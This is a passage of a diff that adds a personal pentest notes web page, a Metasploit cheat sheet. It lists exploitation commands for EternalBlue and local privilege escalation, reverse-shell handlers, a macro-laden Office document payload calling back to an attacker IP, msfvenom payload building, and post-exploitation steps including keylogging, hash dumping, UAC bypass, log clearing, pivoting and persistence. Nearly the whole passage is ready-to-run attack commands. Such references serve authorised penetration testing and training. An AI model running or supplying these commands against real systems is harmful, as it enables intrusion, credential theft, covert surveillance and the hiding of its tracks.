+msf exploit(psexec) &gt; exploit
+## Set SMBDomain, SMBPass (hash format), SMBUser
+</code></pre>
+<h3>Use SOCKS Proxy</h3>
+<pre><code class="language-powershell">setg Proxies socks4:127.0.0.1:1080
+</code></pre>
+<h3>Routing &amp; Pivoting</h3>
+<pre><code>run post/multi/manage/autoroute
+use auxiliary/server/socks_proxy
+</code></pre>
+<h2 id="msf-plugins">MSF Plugins</h2>
+<h3>List / Load Plugins</h3>
+<pre><code class="language-bash">## List available plugins:
+ls /usr/share/metasploit-framework/plugins
+
+## Load plugin:
+msf6 &gt; load nessus
+msf6 &gt; load pentest
+
+## Plugin help:
+msf6 &gt; nessus_help
+</code></pre>
+<h3>Install Custom Plugins</h3>
+<pre><code class="language-bash">git clone https://github.com/darkoperator/Metasploit-Plugins
+sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+
+## In msfconsole:
+reload_all
+load pentest
+</code></pre>
+<h3>Writing &amp; Importing Custom Modules</h3>
+<pre><code class="language-bash">## Search exploit-db for MSF modules:
+searchsploit &lt;product&gt;
+searchsploit -t Nagios3 --exclude=&quot;.py&quot;
+
+## Copy module to MSF path:
+sudo cp exploit.rb /usr/share/metasploit-framework/modules/exploits/&lt;os&gt;/&lt;cat&gt;/&lt;name&gt;.rb
+## OR user path:
+mkdir -p ~/.msf4/modules/exploits/&lt;os&gt;/&lt;cat&gt;/
+cp exploit.rb ~/.msf4/modules/exploits/&lt;os&gt;/&lt;cat&gt;/&lt;name&gt;.rb
+
+## Load in msfconsole:
+msfconsole -m /usr/share/metasploit-framework/modules/
+## OR inside msf:
+reload_all
+loadpath /usr/share/metasploit-framework/modules/
+</code></pre>
+<h2 id="common-exploits">Common Exploits</h2>
+<h3>MS17-010 EternalBlue Workflow</h3>
+<pre><code>## 1) Check vulnerability:
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS &lt;IP&gt;
+run
+
+## 2) Exploit:
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS &lt;IP&gt;
+set LHOST &lt;IP&gt;
+set payload windows/meterpreter/reverse_tcp
+exploit
+</code></pre>
+<h3>Local Exploit Suggester (Privilege Escalation)</h3>
+<pre><code>use post/multi/recon/local_exploit_suggester
+set SESSION &lt;id&gt;
+run
+</code></pre>
+<h3>KiTrap0D Privilege Escalation (Windows)</h3>
+<pre><code>use exploit/windows/local/ms10_015_kitrap0d
+set SESSION &lt;id&gt;
+set LHOST &lt;IP&gt;
+set LPORT 1338
+run
+</code></pre>
+<h3>Baron Samedit (Linux sudo Privilege Escalation)</h3>
+<pre><code>use exploit/linux/local/sudo_baron_samedit
+set SESSION &lt;id&gt;
+set LHOST &lt;IP&gt;
+run
+</code></pre>
+<h3>Best of - Exploits</h3>
+<ul>
+<li>MS17-10 Eternal Blue - <code>exploit/windows/smb/ms17_010_eternalblue</code></li>
+<li>MS08_67 - <code>exploit/windows/smb/ms08_067_netapi</code></li>
+</ul>
+<h2 id="scripting-metasploit">Scripting Metasploit</h2>
+<p>Using a <code>.rc file</code>, write the commands to execute, then run <code>msfconsole -r ./file.rc</code>. Here is a simple example to script the deployment of a handler and create an Office doc with macro.</p>
+<pre><code class="language-powershell">use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 4646
+set ExitOnSession false
+exploit -j -z
+
+
+use exploit/multi/fileformat/office_word_macro 
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST &lt;ATTACKER_IP&gt;
+set LPORT 4646
+exploit
+</code></pre>
+<h2 id="multiple-transports">Multiple Transports</h2>
+<pre><code class="language-powershell">msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;host&gt; lport=&lt;port&gt; sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
+</code></pre>
+<p>Then, in <code>AddTransports.ps1</code>:</p>
+<pre><code class="language-powershell">Add-TcpTransport -lhost &lt;host&gt; -lport &lt;port&gt; -RetryWait 10 -RetryTotal 30
+Add-WebTransport -Url http(s)://&lt;host&gt;:&lt;port&gt;/&lt;luri&gt; -RetryWait 10 -RetryTotal 30
+</code></pre>
+<h2 id="msf-resource-scripts-automation">MSF Resource Scripts (Automation)</h2>
+<pre><code class="language-bash">## List built-in resource scripts
+ls /usr/share/metasploit-framework/scripts/resource/
+
+## Create custom handler script
+cat &gt; handler.rc &lt;&lt; 'EOF'
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST &lt;LHOST&gt;
+set LPORT &lt;LPORT&gt;
+run
+EOF
+
+msfconsole -r handler.rc
+
+## Save current module config as resource file (inside msfconsole)
+makerc portscan.rc
+</code></pre>
+<h2 id="msf-post-exploitation-modules-windows">MSF Post-Exploitation Modules (Windows)</h2>
+<pre><code class="language-bash">## Privilege enumeration
+use post/windows/gather/win_privs
+set SESSION &lt;ID&gt;
+run
+
+## Logged on users
+use post/windows/gather/enum_logged_on_users
+
+## Check if running in VM
+use post/windows/gather/checkvm
+
+## Installed applications
+use post/windows/gather/enum_applications
+
+## Antivirus enumeration
+use post/windows/gather/enum_av_excluded
+
+## Installed patches
+use post/windows/gather/enum_patches
+
+## SMB shares via registry
+use post/windows/gather/enum_shares
+
+## Enable RDP
+use post/windows/manage/enable_rdp
+set ENABLE true
+set SESSION &lt;ID&gt;
+run
+
+## UAC Bypass
+use exploit/windows/local/bypassuac_injection
+set SESSION &lt;ID&gt;
+set TARGET Windows\ x64
+run
+
+## Keylogging
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+## Clear event logs
+clearev
+</code></pre>
+<h2 id="msf-post-exploitation-modules-linux">MSF Post-Exploitation Modules (Linux)</h2>
+<pre><code class="language-bash">## Gather configs
+use post/linux/gather/enum_configs
+
+## Environment variables
+use post/multi/gather/env
+
+## Network information
+use post/linux/gather/enum_network
+
+## Protection enumeration (AV, firewall)
+use post/linux/gather/enum_protections
+
+## Container detection
+use post/linux/gather/checkcontainer
+
+## VM detection
+use post/linux/gather/checkvm
+
+## User history
+use post/linux/gather/enum_users_history
+
+## Hash dumping
+use post/linux/gather/hashdump
+
+## Upgrade shell to meterpreter
+sessions -u &lt;ID&gt;
+</code></pre>
+<h2 id="msf-pivoting">MSF Pivoting</h2>
+<pre><code class="language-bash">## Add route through compromised host
+run autoroute -s &lt;INTERNAL_SUBNET&gt;
+background
+
+## Port scan internal network
+use auxiliary/scanner/portscan/tcp
+set RHOSTS &lt;INTERNAL_IP&gt;
+set PORTS 1-100
+run
+
+## Port forwarding
+portfwd add -l &lt;LOCAL_PORT&gt; -p &lt;REMOTE_PORT&gt; -r &lt;INTERNAL_IP&gt;
+
+## SOCKS proxy for proxychains
+use auxiliary/server/socks_proxy
+set VERSION 4a
+set SRVPORT 9050
+run
+
+## Then scan via proxychains
+## proxychains nmap -sV -Pn -sT &lt;INTERNAL_IP&gt;
+</code></pre>
+<p><strong>Pivoted-target payload gotcha — use <code>bind_tcp</code>, not <code>reverse_tcp</code>:</strong></p>
+<p>When you exploit an INTERNAL host through a Meterpreter pivot, a reverse payload can't call back — the internal host has no route to Kali. Bind payloads flip the direction: Kali connects TO the internal host via the pivot.</p>
+<pre><code>msf6 &gt; use exploit/windows/smb/psexec
+msf6 exploit(psexec) &gt; set RHOSTS &lt;INTERNAL_TARGET&gt;
+msf6 exploit(psexec) &gt; set SMBUser &lt;USER&gt;
+msf6 exploit(psexec) &gt; set SMBPass &lt;PASS&gt;
+msf6 exploit(psexec) &gt; set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(psexec) &gt; set LPORT 8000                        # port on the INTERNAL target
+msf6 exploit(psexec) &gt; set RHOST &lt;INTERNAL_TARGET&gt;           # confirm
+msf6 exploit(psexec) &gt; exploit -j
+</code></pre>
+<p>Metasploit connects OUT from Kali -&gt; through autoroute'd pivot -&gt; IN to <code>&lt;INTERNAL_TARGET&gt;:8000</code> and picks up the session. No callback traffic needed.</p>
+<p>Same principle for <code>windows/x64/shell/bind_tcp</code>, <code>linux/x64/meterpreter/bind_tcp</code>, etc.</p>
+<h2 id="msf-persistence-modules">MSF Persistence Modules</h2>
+<pre><code class="language-bash">## Windows - service-based persistence
+use exploit/windows/local/persistence_service
+set SESSION &lt;ID&gt;
+set LHOST &lt;LHOST&gt;
+run
+
+## Linux - cron persistence
+use exploit/linux/local/cron_persistence
+set SESSION &lt;ID&gt;
+set LHOST &lt;LHOST&gt;
+run
+
+## Linux - service persistence
+use exploit/linux/local/service_persistence
+set SESSION &lt;ID&gt;
+set LHOST &lt;LHOST&gt;
+run
+
+## Linux - SSH key persistence
+use post/linux/manage/sshkey_persistence
+set CREATESSHFOLDER true
+set SESSION &lt;ID&gt;
+run
+</code></pre>
+<h2 id="wmap-web-scanner">WMAP Web Scanner</h2>
+<pre><code class="language-bash">load wmap
+wmap_sites -a &lt;TARGET_IP&gt;
+wmap_targets -t http://&lt;TARGET_IP&gt;
+wmap_sites -l
+wmap_targets -l
+wmap_run -t    # test
+wmap_run -e    # execute
+</code></pre>
+<h2 id="db-autopwn-plugin">db_autopwn Plugin</h2>
+<pre><code class="language-bash">git clone https://github.com/hahwul/metasploit-autopwn.git
+sudo cp metasploit-autopwn/db_autopwn.rb /usr/share/metasploit-framework/plugins/
+
+## In msfconsole
+load db_autopwn
+db_autopwn -p -t -PI 445
+</code></pre>
+<h2 id="nmap-integration">Nmap Integration</h2>
+<pre><code class="language-bash">## Run nmap from within MSF
+db_nmap -sS -sV -O -p- &lt;TARGET_IP&gt;
+hosts
+services
+vulns
+analyze
+
+## Import external nmap XML
+db_import nmap_results.xml
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://docs.rapid7.com/metasploit/">Metasploit Framework Official Documentation</a></li>
+<li><a href="https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/">Multiple transports in a meterpreter payload - ionize</a></li>
+<li><a href="https://netsec.ws/?p=331">Creating Metasploit Payloads - Peleus</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / metasploit · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
